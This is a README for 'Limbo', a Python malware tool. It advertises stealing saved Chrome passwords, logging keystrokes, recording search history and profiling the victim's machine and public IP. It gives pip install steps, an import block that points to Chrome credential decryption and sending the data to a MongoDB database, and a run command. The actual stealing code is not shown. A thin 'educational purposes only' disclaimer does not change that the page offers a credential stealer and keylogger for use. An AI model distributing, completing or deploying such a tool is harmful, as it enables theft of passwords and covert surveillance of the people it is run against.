# Limbo

Limbo is a powerful malware tool that can be used to collect various types of information from a user's computer. Specifically, it is capable of:

- Collecting saved passwords from Google Chrome
- Recording search history
- Collecting keystrokes
- Gathering data about the user's computer, including RAM, OS, CPU, and GPU
- Finding the user's public IP and information about it

It's important to note that Limbo is intended for educational purposes only. As the creator, I take no responsibility for any illegal activities that may be carried out using this tool. I have made the code public for viewing purposes only, and urge you to use it ethically and responsibly

# Installation

To use Limbo, you will need to install several Python libraries. You can install these libraries using pip, the Python package manager. Here are the required libraries:

```Bash
pip install wmi
pip install psutil
pip install requests
pip install pypiwin32
pip install pynput
pip install pymongo
pip install pycryptodome
```

After you need to connect you mongodb database

```python
import os
import sys
import wmi
import json
import base64
import socket
import psutil
import requests
import platform
import win32crypt
from Cryptodome.Cipher import AES
import sqlite3
import shutil
import subprocess
from pynput import keyboard
from pynput.keyboard import Key
from pymongo import MongoClient
from datetime import timezone, datetime, timedelta

cluster = MongoClient() #your database here
```

# Usage

After cloning the repository and installing the required libraries, you can use Limbo by running the limbo.py file:

```Bash
python limbo.py
```

# Disclaimer

Limbo is intended for educational purposes only. The creator assumes no responsibility for any illegal activities carried out with it, and the code is made public for viewing purposes only. Please use this tool ethically and responsibly.
